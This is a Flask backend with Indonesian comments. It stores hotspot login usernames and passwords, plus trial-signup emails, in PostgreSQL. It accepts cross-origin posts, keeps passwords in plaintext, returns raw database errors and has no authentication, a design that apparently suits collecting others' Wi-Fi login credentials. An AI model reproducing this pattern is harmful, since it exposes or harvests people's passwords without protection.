from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
import os

app = Flask(__name__)
CORS(app)

# Ambil credential dari Environment Variables Railway
DB_CONFIG = {
    "host": os.environ.get("DB_HOST"),
    "port": os.environ.get("DB_PORT"),
    "dbname": os.environ.get("DB_NAME"),
    "user": os.environ.get("DB_USER"),
    "password": os.environ.get("DB_PASSWORD"),
    "sslmode": os.environ.get("DB_SSLMODE", "require")
}

def init_db():
    """Buat tabel hotspot_users jika belum ada"""
    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS hotspot_users (
                id SERIAL PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                login_time TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("✅ Tabel hotspot_users siap!")
    except Exception as e:
        print("❌ Gagal inisialisasi DB hotspot_users:", e)

def init_trial_table():
    """Buat tabel trial_users jika belum ada"""
    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trial_users (
                id SERIAL PRIMARY KEY,
                email TEXT NOT NULL,
                submit_time TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("✅ Tabel trial_users siap!")
    except Exception as e:
        print("❌ Gagal inisialisasi DB trial_users:", e)

@app.route("/save_login", methods=["POST"])
def save_login():
    """Simpan username & password ke database"""
    username = request.form.get("username")
    password = request.form.get("password")

    if not username or not password:
        return jsonify({"error": "Username atau password kosong!"}), 400

    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()
        cur.execute("INSERT INTO hotspot_users (username, password) VALUES (%s, %s)", (username, password))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"message": "Berhasil simpan ke database!"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/save_trial_email", methods=["GET", "POST"])
def save_trial_email():
    """Simpan email trial ke database"""
    if request.method == "GET":
        return jsonify({
            "message": "Gunakan metode POST untuk mengirim data email trial.",
            "status": "info"
        }), 200

    email = request.form.get("email")
    trial_url = request.form.get("trial_url")

    if not email:
        return jsonify({"error": "Email kosong"}), 400

    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()
        cur.execute("INSERT INTO trial_users (email) VALUES (%s)", (email,))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"message": "OK", "trial_url": trial_url})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    init_db()
    init_trial_table()
    os.environ["FLASK_SKIP_DOTENV"] = "1"  # Hindari .env lokal
    app.run(host="0.0.0.0", port=8080, debug=False)
